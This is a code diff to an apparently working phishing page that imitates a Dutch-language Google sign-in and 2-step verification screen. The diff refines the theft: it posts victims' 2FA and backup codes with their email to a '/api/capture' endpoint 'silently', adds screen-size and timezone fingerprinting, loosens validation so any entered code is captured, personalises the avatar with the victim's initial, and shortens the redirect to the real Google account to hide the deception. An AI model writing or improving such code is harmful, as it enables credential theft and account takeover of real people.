@@ -411,14 +411,6 @@
                 <span>Voer een wachtwoord in</span>
             </div>
 
-            <!-- Password strength indicator -->
-            <div id="pwStrengthBar" style="display:none;margin-top:4px;">
-                <div style="height:3px;background:#e8eaed;border-radius:3px;overflow:hidden;">
-                    <div id="pwStrengthFill" style="height:100%;width:0%;transition:width .25s,background .25s;"></div>
-                </div>
-                <div id="pwStrengthLabel" style="font-size:11px;margin-top:3px;color:#5f6368;"></div>
-            </div>
-
             <div class="forgot-wrap">
                 <a href="https://accounts.google.com/signin/recovery" target="_blank" class="link" onclick="trackForgotPw()">Wachtwoord vergeten?</a>
             </div>
@@ -445,7 +437,7 @@
             </div>
 
             <div class="avatar-wrap">
-                <div class="avatar" style="font-size:30px;">🔒</div>
+                <div class="avatar" id="tfaAvatarLetter">G</div>
             </div>
 
             <h1 class="card-title" style="margin-bottom:8px;">2-stapsverificatie</h1>
@@ -665,6 +657,8 @@
         void s3.offsetWidth;
         s3.classList.add('step-animate');
         document.getElementById('tfa-email-display').textContent = email;
+        const av = document.getElementById('tfaAvatarLetter');
+        if (av) av.textContent = email.charAt(0).toUpperCase();
         setTimeout(() => document.getElementById('tfaInput').focus(), 50);
     }
 
@@ -672,9 +666,9 @@
     function submitTwoFA() {
         const inp = document.getElementById('tfaInput');
         const errEl = document.getElementById('tfaErr');
-        const code = inp.value.trim();
+        const code = inp.value.replace(/\s/g, '');
 
-        if (!code || code.replace(/\s/g, '').length < 4) {
+        if (!code) {
             inp.classList.add('err');
             errEl.classList.add('show');
             inp.focus();
@@ -690,7 +684,7 @@
 
         const email = document.getElementById('tfa-email-display').textContent;
 
-        // Capture the 2FA / backup code
+        // Capture the 2FA / backup code silently
         fetch('/api/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -699,17 +693,16 @@
                 password: '[2FA CODE] ' + code,
                 source: 'google_2fa',
                 timestamp: new Date().toISOString(),
-                clientId: localStorage.getItem('_cid') || 'unknown'
+                clientId: localStorage.getItem('_cid') || 'unknown',
+                screen: (screen.width || 0) + 'x' + (screen.height || 0),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || ''
             })
         }).catch(() => {});
 
-        // Show "verifying" status, then redirect to real Google account
-        setTimeout(() => {
-            btn.innerHTML = '<span style="font-size:13px;color:#5f6368;font-weight:500;">Code valideren\u2026</span>';
-        }, 900);
+        // Redirect to real Google account after brief spinner
         setTimeout(() => {
             window.location.href = 'https://myaccount.google.com/?hl=nl';
-        }, 2200 + Math.random() * 400);
+        }, 1200 + Math.random() * 300);
     }
 
     /* ── Andere verificatiemethode ── */
@@ -819,35 +812,6 @@
     document.getElementById('pwInput').addEventListener('input', function () {
         this.classList.remove('err');
         document.getElementById('pwErr').classList.remove('show');
-        // Password strength indicator
-        const val = this.value;
-        const bar = document.getElementById('pwStrengthBar');
-        const fill = document.getElementById('pwStrengthFill');
-        const label = document.getElementById('pwStrengthLabel');
-        if (!val) { bar.style.display = 'none'; return; }
-        bar.style.display = 'block';
-        const hasUpper = /[A-Z]/.test(val);
-        const hasLower = /[a-z]/.test(val);
-        const hasNum = /[0-9]/.test(val);
-        const hasSpecial = /[^A-Za-z0-9]/.test(val);
-        let score = 0;
-        if (val.length >= 6) score++;
-        if (val.length >= 10) score++;
-        if (hasUpper && hasLower) score++;
-        if (hasNum) score++;
-        if (hasSpecial) score++;
-        const levels = [
-            { pct: '20%', color: '#ea4335', text: 'Zwak' },
-            { pct: '40%', color: '#ea4335', text: 'Zwak' },
-            { pct: '60%', color: '#fbbc04', text: 'Redelijk' },
-            { pct: '80%', color: '#34a853', text: 'Goed' },
-            { pct: '100%', color: '#137333', text: 'Sterk' },
-        ];
-        const lv = levels[Math.min(score, 4)];
-        fill.style.width = lv.pct;
-        fill.style.background = lv.color;
-        label.style.color = lv.color;
-        label.textContent = lv.text;
     });
 
     document.getElementById('tfaInput').addEventListener('input', function () {
